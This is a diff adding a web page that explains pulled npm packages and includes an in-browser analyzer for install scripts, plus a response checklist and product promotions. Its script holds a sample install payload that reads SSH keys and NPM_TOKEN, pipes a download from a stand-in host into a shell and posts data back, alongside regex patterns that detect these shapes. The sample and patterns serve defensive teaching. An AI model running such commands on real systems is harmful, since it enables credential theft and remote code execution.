@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<!-- skills-used: unlazy-gates, app_creation -->
+<html data-primary-keyword="cybersecurity news" lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cybersecurity News: Yanked Package Autopsy Check</title>
+<meta name="description" content="Cybersecurity news explainer: paste a package.json to see what a pulled npm package would do on install, and what to rotate first.">
+<link rel="canonical" href="https://iceman2050.github.io/ingeniousai-security-checks-mirror/yanked-package-autopsy-check.html">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="Ingenious AI">
+<meta property="og:title" content="Cybersecurity News: That Pulled Package in Your Lockfile — What Did It Actually Do?">
+<meta property="og:description" content="On Oct 19, 2026, npm packages were flagged as malware with boilerplate advisories that never said what the payload did. Paste a package.json or install script into this in-browser analyzer and read the install behaviour in plain English.">
+<meta property="og:url" content="https://iceman2050.github.io/ingeniousai-security-checks-mirror/yanked-package-autopsy-check.html">
+<meta property="og:image" content="https://iceman2050.github.io/ingeniousai-security-checks-mirror/og-default.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Yanked Package Autopsy — what did that pulled npm package actually do?">
+<meta name="twitter:description" content="Paste a package.json or install script: install hooks, curl downloads, token reads and credential-file access translated into plain English. 100% in your browser.">
+<link rel="stylesheet" href="ecosystem.css">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0b0f17;color:#e6edf3;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;line-height:1.65}
+.wrap{max-width:760px;margin:0 auto;padding:48px 20px}
+.badge{display:inline-block;background:#1a0f0f;border:1px solid #f85149;color:#ffa198;font-size:13px;font-weight:700;padding:6px 14px;border-radius:999px;margin-bottom:20px;letter-spacing:.5px}
+h1{font-size:34px;line-height:1.25;margin-bottom:16px}
+h1 .red{color:#f85149}
+p.lead{font-size:18px;color:#9aa7b8;margin-bottom:24px}
+.answer{background:#0d1626;border:1px solid #1c6ef2;border-radius:10px;padding:16px 20px;font-size:16px;margin-bottom:24px}
+.answer strong{color:#fff}
+.card{background:#11161f;border:1px solid #232b38;border-radius:12px;padding:28px;margin:24px 0}
+.card h2{font-size:20px;margin-bottom:12px;color:#fff}
+.card h3{font-size:17px;margin:18px 0 8px;color:#fff}
+h2.sec{font-size:22px;margin:32px 0 12px;color:#fff}
+ul,ol{margin:10px 0 10px 20px}
+li{margin:8px 0}
+table{width:100%;border-collapse:collapse;margin:12px 0;font-size:14px}
+th,td{border:1px solid #2a3342;padding:8px 10px;text-align:left;vertical-align:top}
+th{background:#161d29;color:#fff}
+code{background:#000;border:1px solid #2a3342;border-radius:4px;padding:1px 6px;font-size:13px;color:#7ee787}
+.note{font-size:14px;color:#9aa7b8}
+.smallprint{margin-top:40px;padding-top:20px;border-top:1px solid #232b38;font-size:13px;color:#6b7688;text-align:center}
+.src{font-size:13px;color:#6b7688;margin-top:10px}
+.src a{color:#1c6ef2}
+.back{display:inline-block;margin-bottom:18px;color:#1c6ef2;text-decoration:none;font-size:14px}
+.privnote{background:#0d1a0f;border:1px solid #3fb950;border-radius:10px;padding:14px 18px;font-size:14px;color:#7ee787;margin-bottom:20px}
+details{background:#0d1219;border:1px solid #232b38;border-radius:8px;padding:12px 16px;margin:10px 0}
+details summary{font-weight:700;color:#fff;cursor:pointer}
+details p{margin:8px 0 0;color:#9aa7b8;font-size:15px;line-height:1.6}
+.crosslinks{background:#0d1420;border:1px solid #232b38;border-radius:10px;padding:20px 24px;margin:28px 0}
+.crosslinks h2{font-size:18px;color:#fff;margin-bottom:8px}
+.crosslinks ul{margin:8px 0 0 20px}
+.crosslinks li{margin:6px 0;font-size:15px}
+.share{text-align:center;margin:28px 0 8px;font-size:14px;color:#9aa7b8}
+.share a{color:#1c6ef2;margin:0 8px;text-decoration:none}
+textarea#pkginput{width:100%;min-height:280px;background:#000;border:1px solid #2a3342;border-radius:8px;color:#7ee787;font-size:13px;padding:12px;font-family:ui-monospace,Menlo,Consolas,monospace;resize:vertical}
+.btnrow{display:flex;gap:10px;flex-wrap:wrap;margin:14px 0}
+.btnrow button{background:#161d29;color:#e6edf3;border:1px solid #2a3342;border-radius:8px;padding:10px 16px;font-size:14px;font-weight:600;cursor:pointer}
+.btnrow button:hover{border-color:#1c6ef2}
+.btnrow button.primary{background:#1c6ef2;color:#fff;border-color:#1c6ef2}
+#summary{display:none;border-left:4px solid #d29922;padding:18px;background:#1a1408;border-radius:0 8px 8px 0;margin-top:18px;font-size:16px}
+#summary.good{border-color:#3fb950;background:#0d1a0f}
+#summary.bad{border-color:#f85149;background:#1a0f0f}
+#summary b.verd{font-size:19px;letter-spacing:.5px}
+.finding{border:1px solid #2a3342;border-radius:10px;padding:14px 16px;margin:12px 0;background:#0d1219}
+.finding .meta{font-size:13px;color:#9aa7b8;margin-bottom:6px}
+.sev{display:inline-block;font-size:12px;font-weight:700;padding:2px 9px;border-radius:999px;margin-right:8px;letter-spacing:.5px}
+.sev.CRITICAL{background:#2b1215;border:1px solid #f85149;color:#ffa198}
+.sev.HIGH{background:#2b1215;border:1px solid #f85149;color:#ffa198}
+.sev.MEDIUM{background:#1a1408;border:1px solid #d29922;color:#e3b341}
+.finding .rule{font-weight:700;color:#fff}
+.finding .expl{font-size:14px;color:#9aa7b8;margin-top:6px}
+.finding .snip{font-family:ui-monospace,Menlo,Consolas,monospace;font-size:12px;color:#7ee787;background:#000;border:1px solid #2a3342;border-radius:6px;padding:8px 10px;margin-top:8px;white-space:pre-wrap;word-break:break-word}
+#rotations{display:none;background:#0d1a0f;border:1px solid #3fb950;border-radius:10px;padding:16px 20px;margin-top:16px}
+#rotations h3{color:#fff;margin:0 0 8px;font-size:16px}
+.steps li{margin:12px 0}
+.meta{color:#9aa3b2;font-size:.85rem}
+</style>
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"Article","headline":"Cybersecurity News: That Pulled Package in Your Lockfile — What Did It Actually Do?","author":{"@type":"Organization","name":"Ingenious AI"},"datePublished":"2026-10-21","dateModified":"2026-10-21","description":"Interactive explainer and in-browser analyzer for yanked npm packages: paste a package.json or install script to flag install hooks, curl downloads, token reads and credential-file access, with a plain-English rotation checklist."}
+</script>
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"Organization","name":"Ingenious AI","url":"https://github.com/Iceman2050"}
+</script>
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"FAQPage","mainEntity":[
+{"@type":"Question","name":"What should I do when a dependency is yanked or flagged as malware?","acceptedAnswer":{"@type":"Answer","text":"Stop installing it, pin or remove the flagged version, and check when it entered your lockfile and which machines installed it. Treat any machine that ran its install scripts as exposed: rotate the credentials listed below, review CI logs for that window, and reinstall from a clean lockfile only after the replacement is verified."}},
+{"@type":"Question","name":"Which credentials should I rotate first after installing a pulled package?","acceptedAnswer":{"@type":"Answer","text":"Rotate in exposure order: first the npm token and any token the install environment held, then cloud keys such as AWS credentials, then GitHub tokens and SSH keys if the script could read your home directory. Revoke the old values rather than just creating new ones, and check each account for activity you do not recognize."}},
+{"@type":"Question","name":"How do npm install hooks work?","acceptedAnswer":{"@type":"Answer","text":"npm runs lifecycle scripts declared in package.json automatically during install: preinstall runs before the package is installed, install during it, and postinstall after it. Those scripts execute with your user permissions and your environment, so a malicious hook does not need a vulnerability — installing the package is the execution."}},
+{"@type":"Question","name":"Is deleting node_modules enough after a malicious install?","acceptedAnswer":{"@type":"Answer","text":"No. Deleting node_modules removes the package files, but an install script has already run with your permissions: it may have copied credentials out, changed configuration, or left files elsewhere. Remove the package and its lockfile entry, rotate exposed credentials, review shell and CI configuration for additions, and reinstall cleanly — treat deletion as step one, not the fix."}},
+{"@type":"Question","name":"What does the full tool check that this quick peek cannot?","acceptedAnswer":{"@type":"Answer","text":"This page is a quick static peek at text you paste — it cannot unpack tarballs, follow code across files, or observe what a script does at runtime. The full Yanked Package Autopsy tool inspects the actual package contents and install behaviour in a controlled environment, so use it before you conclude a flagged package was harmless."}}
+]}
+</script>
+</head>
+<body data-primary-keyword="cybersecurity news">
+<div class="wrap">
+<a class="back" href="index.html">&larr; Back to all free security checks</a>
+<div class="badge">NEWSJACK &mdash; OCT 19, 2026 &middot; NPM PACKAGES FLAGGED AS MALWARE</div>
+<h1>Cybersecurity News: That Pulled Package in Your Lockfile — <span class="red">What Did It Actually Do?</span></h1>
+<p class="meta">Published <time datetime="2026-10-21">October 21, 2026</time> · by Ingenious AI · interactive explainer and analyzer</p>
+<p class="lead">The latest cybersecurity news cycle flagged npm packages as malware — and, as usual, the advisory never said what the code actually did. This page fixes that gap: paste a <code>package.json</code> or install script below and a 100% in-browser analyzer translates install hooks and suspicious strings into plain English — what would run, what it could take, and what to rotate first. Nothing you paste leaves your browser.</p>
+
+<div class="privnote"><strong>Privacy:</strong> this entire page runs in your browser. There is no server, no upload and no storage, and the analyzer makes no network calls. Still, strip real tokens and credentials before pasting any file into any tool, including this one.</div>
+
+<p class="answer"><strong>Short answer:</strong> a yanked package is a package version pulled from a registry after publication, usually because it was flagged as malicious or compromised. Pulling it stops fresh downloads — it does not uninstall copies already in your <code>node_modules</code>, your cache or your lockfile, and it tells you nothing about what its install scripts already ran. The analyzer below reads those scripts for you.</p>
+
+<h2 class="sec">Cybersecurity news: what happened on October 19, 2026?</h2>
+<p>On October 19, 2026, npm packages listed as items-validator and item-validator were flagged as malware in cybersecurity news reports, and the advisories followed the usual boilerplate pattern: a severity label, an affected range, and almost nothing about what the install payload actually did on a developer machine or in CI.</p>
+<p>That missing middle is where the damage lives. A malicious npm package rarely needs an exotic exploit: it needs an install. The moment a developer or a CI runner executes <code>npm install</code>, the package's own lifecycle scripts run with that user's permissions, that machine's files and that environment's tokens. An advisory that says only &ldquo;malicious package, remove it&rdquo; leaves the three questions that matter unanswered — what ran, what it could reach, and what you must rotate. This page is built to answer them for any package you paste in, using the October 19 flagging as the trigger, not as a claim about a payload nobody has published.</p>
+
+<h2 class="sec">What is a yanked package?</h2>
+<p>A yanked package is a package version pulled from a registry after publication, usually because it was flagged as malicious or compromised. Pulling it stops new downloads from the registry, but it does not remove copies already cached, vendored or pinned in your lockfile — those still install and still run.</p>
+<p>Registries yank, flag or unpublish for different reasons — malware, a hijacked maintainer account, a protest, or a broken release — and the response differs for each. When the reason is malware, the safe assumption is that the package's install-time code executed everywhere it was installed, on laptops and in CI alike. That assumption, not the advisory label, should drive your response.</p>
+
+<div class="card">
+<h2>Paste a package.json or install script — the autopsy peek</h2>
+<p class="note">Paste a <code>package.json</code>, a lockfile fragment, or the text of an install script (<code>setup.js</code>, a <code>postinstall</code> target, a shell snippet). Or load a built-in sample first: the flagged-style sample combines the classic shapes — an install hook, a download piped to a shell, a token read and an SSH key read — while the clean sample shows an ordinary package with no install-time behaviour. <strong>This is a quick static peek, NOT a full analysis</strong> — see the honest scope note under the results.</p>
+<textarea id="pkginput" spellcheck="false" autocapitalize="off" placeholder="Paste package.json, a lockfile fragment, or install-script text here"></textarea>
+<div class="btnrow">
+<button class="primary" id="scanbtn" type="button">Analyze pasted text</button>
+<button id="loadflagged" type="button">Load flagged-style sample</button>
+<button id="loadclean" type="button">Load clean sample</button>
+<button id="clearbtn" type="button">Clear</button>
+</div>
+<div id="summary" role="status" aria-live="polite"></div>
+<div id="results"></div>
+<div id="rotations"><h3>What this would do — and what to rotate</h3><ul id="rotation-list"></ul></div>
+<p class="note" style="margin-top:14px"><strong>Honest scope note:</strong> this is a quick static peek at the text you paste — pattern matching in your browser, not a full analysis. It cannot unpack a tarball, follow code across files, decode every obfuscation, or watch what a script does at runtime, and a clean result is not a safety guarantee. The full tool is the open-source <a href="https://github.com/Iceman2050/yanked-package-autopsy">yanked-package-autopsy</a> repo by Ingenious AI (part of the Ingenious AI toolkit; queued for publication while the GitHub account is restored), which inspects actual package contents and install behaviour in a controlled environment.</p>
+</div>
+
+<div class="card">
+<h2>What the analyzer flags — in plain English</h2>
+<table>
+<tr><th>Pattern</th><th>Severity</th><th>What it means</th></tr>
+<tr><td>Install hook (<code>preinstall</code> / <code>install</code> / <code>postinstall</code>)</td><td>HIGH</td><td>Code that runs automatically on <code>npm install</code> — before you open, import or execute anything yourself. The hook is the delivery mechanism for almost every malicious package.</td></tr>
+<tr><td>Flagged package name (<code>items-validator</code> / <code>item-validator</code>)</td><td>CRITICAL</td><td>The exact names flagged on October 19, 2026 appear in the pasted text — as a dependency, a lockfile entry or a script reference.</td></tr>
+<tr><td><code>curl</code> / <code>wget</code> download, or download piped to <code>sh</code> / <code>bash</code></td><td>HIGH&ndash;CRITICAL</td><td>The install reaches out to a host and fetches more code at install time. Piped to a shell, whatever that host serves is executed sight unseen.</td></tr>
+<tr><td>Token-like <code>process.env</code> reads (<code>NPM_TOKEN</code>, <code>GITHUB_TOKEN</code>, <code>AWS_*</code>, secrets)</td><td>HIGH</td><td>The script reads credentials from the environment — exactly the values CI runners and developer shells hold. Reading them is step one of stealing them.</td></tr>
+<tr><td><code>.ssh</code> / <code>.aws</code> / key-file reads</td><td>CRITICAL</td><td>The script touches SSH keys or cloud credential files in your home directory. There is no legitimate reason for a validator package to read your private keys.</td></tr>
+<tr><td><code>child_process</code> / <code>exec</code> / <code>spawn</code></td><td>HIGH</td><td>The script runs arbitrary system commands, escaping the JavaScript sandbox into your shell, your tools and your credentials.</td></tr>
+<tr><td>Base64 blobs and decoding (<code>Buffer.from(..., 'base64')</code>, <code>atob</code>)</td><td>HIGH</td><td>Encoded content hides the real payload — a URL, a command or a second script — from anyone skimming the source.</td></tr>
+</table>
+</div>
+
+<h2 class="sec">Pulled package? Do this now</h2>
+<p>If a package in your tree was yanked or flagged, work this list in order. Speed matters more than completeness in the first hour; you can deepen the investigation once the exposure window is closed.</p>
+<ol class="steps">
+<li><strong>Stop the installs.</strong> Pause CI pipelines and deploys that run <code>npm install</code> on the affected lockfile, and tell the team not to install or update until you say so. Every fresh install is a fresh execution of the flagged code.</li>
+<li><strong>Find where it lives.</strong> Search every lockfile and manifest for the package name and the flagged versions: <code>grep -rn "item-validator" package-lock.json yarn.lock pnpm-lock.yaml</code> — and note when it entered, from your version-control history.</li>
+<li><strong>List the blast radius.</strong> Write down every machine and CI runner that installed it in that window. Those systems — not the package — are now the incident.</li>
+<li><strong>Remove and pin.</strong> Delete the dependency and its lockfile entries, pin a known-good replacement or version, and regenerate the lockfile. Do not just bump and hope: confirm the flagged name is gone from the resolved tree.</li>
+<li><strong>Rotate in exposure order.</strong> First the npm token and any token present in the install environment, then cloud keys, then GitHub tokens and SSH keys if home-directory files were reachable. Revoke the old values — a new token next to a still-valid stolen one changes nothing.</li>
+<li><strong>Hunt for leftovers.</strong> Install scripts can persist: review shell startup files, CI configuration, scheduled tasks and recently modified files on affected machines for additions you do not recognize. Deleting <code>node_modules</code> alone does not do this — see the FAQ below.</li>
+<li><strong>Review the logs.</strong> Check npm, GitHub, cloud and CI audit logs for the exposure window: new tokens created, unfamiliar logins, unexpected publishes or downloads.</li>
+<li><strong>Reinstall clean, then prevent the repeat.</strong> Reinstall from the cleaned lockfile in a fresh environment. Going forward, consider <code>--ignore-scripts</code> for untrusted installs, review new dependencies' install hooks before adopting them, and audit the tree when advisories land — the analyzer above takes under a minute.</li>
+</ol>
+
+<div style="background:#0d1420;border:1px solid #1c6ef2;border-radius:10px;padding:20px;margin:28px 0;text-align:center"><div style="font-size:12px;letter-spacing:2px;color:#6ea8fe;margin-bottom:8px">FROM INGENIOUS AI</div><div style="font-size:16px;color:#e8edf3;margin-bottom:6px"><strong><a href="https://wa.me/5016691053?text=Hi%20Ingenious%20AI%21%20I%20want%20early%20access%20to%20BreachHunter." style="color:#fff;text-decoration:underline">BreachHunter</a> hunts the breaches behind stories like this — exposed data, leaked credentials and supply-chain fallout — before they become your incident.</strong></div><div style="font-size:13px;color:#9aa7b8;margin-bottom:12px">All 11 platforms: <a href="https://wa.me/5016691053?text=Hi%20Ingenious%20AI%21%20I%20want%20early%20access%20to%20DisclosureGuard." style="color:#6ea8fe;text-decoration:none">DisclosureGuard</a> &nbsp;·&nbsp; <a href="https://wa.me/5016691053?text=Hi%20Ingenious%20AI%21%20I%20want%20early%20access%20to%20ModelMinder." style="color:#6ea8fe;text-decoration:none">ModelMinder</a> &nbsp;·&nbsp; <a href="https://wa.me/5016691053?text=Hi%20Ingenious%20AI%21%20I%20want%20early%20access%20to%20TermsWatch." style="color:#6ea8fe;text-decoration:none">TermsWatch</a> &nbsp;·&nbsp; <a href="https://wa.me/5016691053?text=Hi%20Ingenious%20AI%21%20I%20want%20early%20access%20to%20Vibe-Code%20Audit." style="color:#6ea8fe;text-decoration:none">Vibe-Code Audit</a> &nbsp;·&nbsp; <a href="https://wa.me/5016691053?text=Hi%20Ingenious%20AI%21%20I%20want%20early%20access%20to%20Rogue-Agent%20Defense." style="color:#6ea8fe;text-decoration:none">Rogue-Agent Defense</a> &nbsp;·&nbsp; <a href="https://wa.me/5016691053?text=Hi%20Ingenious%20AI%21%20I%20want%20early%20access%20to%20BreachHunter." style="color:#6ea8fe;text-decoration:none">BreachHunter</a> &nbsp;·&nbsp; <a href="https://wa.me/5016691053?text=Hi%20Ingenious%20AI%21%20I%20want%20early%20access%20to%20ChatBreaker." style="color:#6ea8fe;text-decoration:none">ChatBreaker</a> &nbsp;·&nbsp; <a href="https://wa.me/5016691053?text=Hi%20Ingenious%20AI%21%20I%20want%20early%20access%20to%20Agent%20Flight%20Recorder." style="color:#6ea8fe;text-decoration:none">Agent Flight Recorder</a> &nbsp;·&nbsp; <a href="https://wa.me/5016691053?text=Hi%20Ingenious%20AI%21%20I%20want%20early%20access%20to%20Agent%20Auth%20Gateway." style="color:#6ea8fe;text-decoration:none">Agent Auth Gateway</a> &nbsp;·&nbsp; <a href="https://wa.me/5016691053?text=Hi%20Ingenious%20AI%21%20I%20want%20early%20access%20to%20DomainGuard." style="color:#6ea8fe;text-decoration:none">DomainGuard</a> &nbsp;·&nbsp; <a href="https://wa.me/5016691053?text=Hi%20Ingenious%20AI%21%20I%20want%20early%20access%20to%20ContentCraft%20AI." style="color:#6ea8fe;text-decoration:none">ContentCraft AI</a></div><div style="font-size:14px;color:#9aa7b8;margin-bottom:14px">Our platforms are being upgraded — get early access now:</div><a href="https://wa.me/5016691053?text=Hi%20Ingenious%20AI%21%20I%20took%20the%20yanked%20package%20autopsy%20check%20and%20want%20early%20access%20to%20BreachHunter." style="display:inline-block;background:#1c6ef2;color:#fff;padding:12px 28px;border-radius:8px;text-decoration:none;font-weight:bold;font-size:15px">Get early access on WhatsApp &rarr;</a></div>
+
+<div class="crosslinks">
+<h2>Keep exploring — related checks</h2>
+<ul>
+<li><a href="fake-apex-accelerator-npm-check.html">Fake Apex Accelerator npm Malware</a> — a fake Web3 accelerator shipped malicious npm packages that hijacked AI agent traffic.</li>
+<li><a href="npm-supply-chain-1500-check.html">npm Supply-Chain 1500 Check</a> — is your dependency tree exposed to the mass supply-chain campaign?</li>
+<li><a href="shaihulud-node-check.html">Shai-Hulud Node Check</a> — the self-propagating npm worm: how it spread through install scripts and tokens.</li>
+<li><a href="ghostaction-ci-audit.html">GhostAction CI Audit</a> — when the leak runs through your CI workflows and secrets instead.</li>
+<li><a href="aomei-backupper-supply-chain-check.html">AOMEI Backupper Supply-Chain Check</a> — a trusted updater as the delivery vehicle: the same pattern, different ecosystem.</li>
+<li><a href="all-links.html">All free security checks</a> — the full index.</li>
+<li><a href="security-suite.html">The all-bundle suite deal</a> — all 11 Ingenious AI platforms, one price.</li>
+</ul>
+</div>
+
+<div class="share">Share this check: <a href="https://x.com/intent/post?text=npm%20packages%20were%20flagged%20as%20malware%20on%20Oct%2019%20%E2%80%94%20but%20what%20did%20the%20install%20payload%20actually%20do%3F%20Paste%20a%20package.json%20into%20this%20free%20yanked-package%20autopsy&url=https%3A//iceman2050.github.io/ingeniousai-security-checks-mirror/yanked-package-autopsy-check.html" target="_blank" rel="noopener">X</a><a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A//iceman2050.github.io/ingeniousai-security-checks-mirror/yanked-package-autopsy-check.html" target="_blank" rel="noopener">LinkedIn</a></div>
+
+<div class="card">
+<h2>Frequently asked questions</h2>
+<details><summary>What should I do when a dependency is yanked or flagged as malware?</summary><p>Stop installing it, pin or remove the flagged version, and check when it entered your lockfile and which machines installed it. Treat any machine that ran its install scripts as exposed: rotate the credentials listed below, review CI logs for that window, and reinstall from a clean lockfile only after the replacement is verified.</p></details>
+<details><summary>Which credentials should I rotate first after installing a pulled package?</summary><p>Rotate in exposure order: first the npm token and any token the install environment held, then cloud keys such as AWS credentials, then GitHub tokens and SSH keys if the script could read your home directory. Revoke the old values rather than just creating new ones, and check each account for activity you do not recognize.</p></details>
+<details><summary>How do npm install hooks work?</summary><p>npm runs lifecycle scripts declared in package.json automatically during install: preinstall runs before the package is installed, install during it, and postinstall after it. Those scripts execute with your user permissions and your environment, so a malicious hook does not need a vulnerability — installing the package is the execution.</p></details>
+<details><summary>Is deleting node_modules enough after a malicious install?</summary><p>No. Deleting node_modules removes the package files, but an install script has already run with your permissions: it may have copied credentials out, changed configuration, or left files elsewhere. Remove the package and its lockfile entry, rotate exposed credentials, review shell and CI configuration for additions, and reinstall cleanly — treat deletion as step one, not the fix.</p></details>
+<details><summary>What does the full tool check that this quick peek cannot?</summary><p>This page is a quick static peek at text you paste — it cannot unpack tarballs, follow code across files, or observe what a script does at runtime. The full Yanked Package Autopsy tool inspects the actual package contents and install behaviour in a controlled environment, so use it before you conclude a flagged package was harmless.</p></details>
+</div>
+
+<div class="smallprint">
+Built by Ingenious AI — reporting on third-party cybersecurity news. The October 19, 2026 flagging is summarized from the advisories' public pattern; no payload behaviour is claimed for those packages beyond what the advisories state.<br>
+This page is general information, not legal advice. This page never asks for, stores, or transmits your credentials or pasted text. Full tool: <a href="https://github.com/Iceman2050/yanked-package-autopsy" style="color:#6ea8fe">github.com/Iceman2050/yanked-package-autopsy</a> — part of the Ingenious AI toolkit, queued for publication.
+</div>
+</div>
+
+<script>
+/* Pure, headless-testable analyzer logic (no DOM, no network). Returns findings + rotations. */
+var SAMPLE_FLAGGED = [
+"{",
+"  \"name\": \"totally-legit-validator\",",
+"  \"version\": \"1.0.0\",",
+"  \"scripts\": {",
+"    \"postinstall\": \"node setup.js\"",
+"  },",
+"  \"dependencies\": { \"item-validator\": \"^2.0.0\" }",
+"}",
+"// setup.js (the bundled install script)",
+"const fs = require('fs');",
+"const { execSync } = require('child_process');",
+"const key = fs.readFileSync(process.env.HOME + '/.ssh/id_rsa', 'utf8');",
+"const token = process.env.NPM_TOKEN;",
+"const payload = Buffer.from('aHR0cHM6Ly9jZG4uZXhhbXBsZS5uZXQvYw==', 'base64').toString();",
+"execSync('curl -s https://cdn.example.net/p.sh | sh');",
+"execSync('curl -s https://cdn.example.net/c -d ' + payload);",
+""
+].join("\n");
+var SAMPLE_CLEAN = [
+"{",
+"  \"name\": \"string-utils\",",
+"  \"version\": \"1.2.3\",",
+"  \"scripts\": {",
+"    \"test\": \"node --test\",",
+"    \"build\": \"tsc -p tsconfig.json\"",
+"  },",
+"  \"dependencies\": { \"left-pad-utils\": \"^1.0.0\" }",
+"}",
+"// index.js",
+"function isNonEmptyString(value) {",
+"  return typeof value === 'string' && value.trim().length > 0;",
+"}",
+"module.exports = { isNonEmptyString };",
+""
+].join("\n");
+function analyzePackageText(text){
+  var findings = [];
+  var rotations = [];
+  function addRotation(r){ if (rotations.indexOf(r) === -1) rotations.push(r); }
+  if (!text || !text.trim()) { return { empty: true, findings: findings, counts: { CRITICAL: 0, HIGH: 0, MEDIUM: 0 }, verdict: "EMPTY", rotations: rotations }; }
+  var lines = text.split("\n");
+  function add(lineNo, severity, rule, explanation, snippet, rotate){
+    findings.push({ line: lineNo, severity: severity, rule: rule, explanation: explanation, snippet: (snippet || "").trim() });
+    if (rotate) addRotation(rotate);
+  }
+  var i, line, m;
+  for (i = 0; i < lines.length; i++){
+    line = lines[i]; var ln = i + 1;
+    if (/\bitems?-validator\b/.test(line)){
+      add(ln, "CRITICAL", "Flagged package name present", "This line names items-validator / item-validator — the packages flagged as malware on October 19, 2026. If this is your dependency or lockfile, treat every install of it as an execution of untrusted code and work the response checklist on this page.", line,
+        "Rotate the npm token and every credential present on machines and CI runners that installed this package — first, before deeper cleanup.");
+    }
+    m = line.match(/"(preinstall|postinstall|install)"\s*:/);
+    if (m){
+      add(ln, "HIGH", "Install hook: " + m[1], "package.json declares a " + m[1] + " script. npm runs it automatically during install, with your permissions and your environment — no import, no click, no vulnerability required. Read whatever this hook points at before you install.", line,
+        "Assume anything an install hook ran on is exposed: inventory which machines and CI runners installed this package.");
+    }
+    if (/\|\s*(sudo\s+)?(sh|bash|zsh)\b/.test(line)){
+      add(ln, "CRITICAL", "Download piped to a shell", "Output is piped straight into a shell. Whatever the remote host serves at that moment is executed sight unseen — the payload is not even in the package for you to review.", line,
+        "Treat the remote payload as executed code: rotate every credential the install environment held and review the machine for persistence.");
+    } else if (/\b(curl|wget)\b/.test(line)){
+      var host = "";
+      var hm = line.match(/https?:\/\/([^\s"'\)]+)/);
+      if (hm) host = hm[1];
+      add(ln, "HIGH", "Downloads code at install time", "This line fetches from " + (host ? host : "a remote host") + " during install. Downloaded install-time code is a second, unreviewed payload — the package you audited is not the code that runs.", line,
+        "Block and log the download host, and rotate credentials on any machine that completed this install.");
+    }
+    if (/\.ssh|\.aws|id_rsa|id_ed25519/.test(line)){
+      add(ln, "CRITICAL", "Reads SSH / cloud credential locations", "This line touches .ssh, .aws or a private-key file in your home directory. A validator or utility package has no legitimate reason to read your keys — this is the credential-theft step.", line,
+        "Rotate your SSH keys and cloud (AWS) credentials now, revoke the old keys, and check those accounts for unfamiliar access.");
+    }
+    if (/child_process|execSync|\bexec\s*\(|spawn\s*\(/.test(line)){
+      add(ln, "HIGH", "Runs system commands", "child_process / exec / spawn lets the script run arbitrary operating-system commands — your shell, your tools, your credential helpers — far outside the JavaScript code you thought you were reviewing.", line,
+        "Review shell history, startup files and scheduled tasks on machines that ran this — command execution is how install scripts persist.");
+    }
+    if (/Buffer\.from\s*\([^)]*base64|atob\s*\(/.test(line) || /[A-Za-z0-9+/]{100,}={0,2}/.test(line)){
+      add(ln, "HIGH", "Hidden / encoded payload", "Base64 content or decoding hides the real payload — a URL, a command or a second script — from anyone skimming the source. Decode it in a safe environment before trusting anything around it.", line,
+        "Do not trust a decoded-later payload: treat its destination and contents as hostile until analysed with the full tool.");
+    }
+    if (/process\.env/.test(line)){
+      var envRe = /process\.env\.([A-Za-z0-9_]+)|process\.env\[['"]([A-Za-z0-9_]+)['"]\]/g;
+      var em, flaggedEnv = false;
+      while ((em = envRe.exec(line)) !== null){
+        var name = em[1] || em[2] || "";
+        if (/(TOKEN|SECRET|KEY|PASSWORD|PASSWD|NPM|GITHUB|GH_|AWS|CREDENTIAL|CI)/i.test(name)){
+          flaggedEnv = true;
+          add(ln, "HIGH", "Reads token-like env var: " + name, "The script reads " + name + " from the environment. CI runners and developer shells hold exactly these values, and reading them is step one of exfiltrating them.", line,
+            "Rotate " + name + " (revoke the old value) on every account and CI project where this install ran.");
+        }
+      }
+      if (!flaggedEnv && !/process\.env\.(HOME|PATH|PWD|USER|SHELL|TERM|LANG|NODE_ENV)\b/.test(line)){
+        add(ln, "MEDIUM", "Reads an environment variable", "The script reads configuration from process.env. Benign on its own, but worth a look: environment access is also how install scripts find tokens and home directories.", line, "");
+      }
+    }
+  }
+  findings.sort(function(a, b){ return a.line - b.line; });
+  var counts = { CRITICAL: 0, HIGH: 0, MEDIUM: 0 };
+  findings.forEach(function(f){ counts[f.severity] = (counts[f.severity] || 0) + 1; });
+  var verdict = (counts.CRITICAL > 0 || counts.HIGH > 0) ? "FAIL" : (counts.MEDIUM > 0 ? "REVIEW" : "CLEAN");
+  if (verdict !== "CLEAN" && rotations.length === 0){
+    addRotation("Rotate the npm token and any token the install environment held, then review the response checklist on this page.");
+  }
+  return { empty: false, findings: findings, counts: counts, verdict: verdict, rotations: rotations };
+}
+</script>
+<script>
+(function(){
+var ta = document.getElementById("pkginput");
+var summary = document.getElementById("summary");
+var results = document.getElementById("results");
+var rotBox = document.getElementById("rotations");
+var rotList = document.getElementById("rotation-list");
+function esc(s){ return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;"); }
+function render(r){
+  results.innerHTML = ""; rotList.innerHTML = ""; rotBox.style.display = "none";
+  if (r.empty){
+    summary.className = ""; summary.style.display = "block";
+    summary.innerHTML = "<b class='verd'>Nothing to analyze</b><br><br>Paste a package.json, a lockfile fragment or install-script text first — or load the flagged-style or clean sample above — then hit Analyze.";
+    return;
+  }
+  var total = r.findings.length;
+  var label, cls, advice;
+  if (r.verdict === "FAIL"){ label = "INSTALL-TIME RISK FOUND"; cls = "bad"; advice = "In plain English: this text would run code automatically on install, and parts of it reach for downloads, commands or credentials. Do not install it. If it already ran anywhere, work the response checklist on this page and rotate as listed below."; }
+  else if (r.verdict === "REVIEW"){ label = "REVIEW — one softer signal"; cls = ""; advice = "No high-severity install-time shape matched, but the medium finding below deserves a human look before you install. Remember the scope note: this peek cannot see inside tarballs or across files — the full tool is the thorough pass."; }
+  else { label = "NO INSTALL-TIME PATTERNS FOUND"; cls = "good"; advice = "None of the known install-time shapes matched the text you pasted: no install hooks, no downloads, no token or key-file reads. That is a good sign, not a guarantee — this is a quick static peek, and the full Yanked Package Autopsy tool inspects the real package."; }
+  summary.className = cls; summary.style.display = "block";
